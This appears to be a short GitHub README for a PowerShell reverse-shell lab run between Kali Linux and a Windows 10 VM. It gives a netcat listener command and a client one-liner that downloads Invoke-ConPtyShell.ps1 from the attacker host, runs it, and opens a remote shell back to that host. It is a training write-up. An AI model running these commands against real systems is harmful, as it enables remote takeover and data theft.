# PowerShell Reverse Shell Lab

## Objective
The objective of this lab is to simulate an attacker gaining remote command execution on a Windows machine using a PowerShell-based reverse shell in a controlled environment.

---

## Lab Environment

- Attacker Machine: Kali Linux
- Target Machine: Windows 10
- Network Configuration: Internal network (VirtualBox)
- Connection Type: Reverse TCP

---

## Tools Used

- Netcat (listener)
- PowerShell
- ComPytShell

---

## Attack Scenario

This lab simulates a situation where an attacker is able to execute a PowerShell command on a target machine, resulting in a reverse shell connection back to the attacker's system.

---

## Methodology

### Listener Setup

On the attacker machine, a Netcat listener is started to wait for incoming connections:

Server Side:
stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 10.38.1.110

Client Side:
IEX(IWR http://10.38.1.110:3000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.38.1.110 87

After this step, I was able to access sensitive data on the target machine, such as user data and system files.

Screenshots:


<img width="1362" height="724" alt="kali1" src="https://github.com/user-attachments/assets/63f35ad7-409e-4433-abfb-7259ae9421f5" />
<img width="1042" height="666" alt="kali2" src="https://github.com/user-attachments/assets/aa84ce69-65c3-4039-8015-6d96575ac1f8" />
<img width="854" height="448" alt="kali3" src="https://github.com/user-attachments/assets/71913bc8-4eb7-41e5-ad5b-656bf22ae332" />
<img width="1026" height="441" alt="kali4" src="https://github.com/user-attachments/assets/8dc6e932-aa81-4810-9176-7060af6c6eee" />
